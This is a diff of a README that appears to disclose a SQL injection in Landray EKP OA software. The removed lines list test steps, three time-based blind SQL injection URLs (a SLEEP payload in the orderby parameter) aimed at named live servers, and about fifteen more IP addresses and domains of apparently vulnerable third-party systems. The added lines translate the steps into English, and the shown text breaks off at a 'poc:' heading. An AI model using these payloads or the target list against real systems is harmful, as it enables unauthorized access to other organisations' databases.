@@ -1,39 +1,13 @@
-# landray
-Landray SQL injection
-蓝凌数字OA(EKP) SQL注入
-一.测试流程：
-1.	寻找蓝凌OA官网，申请试用
-2.	使用他给出的demo环境即可
-3.	登录后台获取cookie（文本末尾有poc）
-4.	替换cookie，和Referer的域名即可
-部分纯在sql注入
- 
-会议处
-二、成功案例（3个）：
-漏洞链接：
-http://oa.wanxinbd.com:8081/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (8233=8233) THEN SLEEP(5) ELSE 8233 END)&ordertype=down&s_ajax=true
- 
-漏洞链接：
-http://demo.landray.com.cn:80/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (2387=2387) THEN SLEEP(5) ELSE 2387 END)&ordertype=down&s_ajax=true
- 
-漏洞链接：
-http://120.79.196.195:8888/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=extractvalue*&ordertype=down&s_ajax=true
- 
-三、其他相同案例地址
-112.90.231.18:8080
-58.215.18.51:9090
-oa.viechina.com:8080
-58.62.112.51:8080
-ytoa.qygtyz.com:8081
-183.237.138.87:8081
-222.180.199.38:9000
-121.33.203.206:7001
-https://120.132.117.213
-114.55.199.141:8080
-116.62.164.136:8080
-wx.gwqm.com
-120.133.134.101
-124.71.109.153:8080
+
+#Landray(EKP) SQL injection
+I. Test process:
+
+1.  Look for the official website of Lanling OA and apply for trial 
+2.  Just use his demo environment 
+3.  Log in to the background to get the cookie (POC at the end of the text) 
+4.  Replace the cookie, and the Referer domain name 
+The meeting place 
+
  
 四.漏洞poc
 poc：
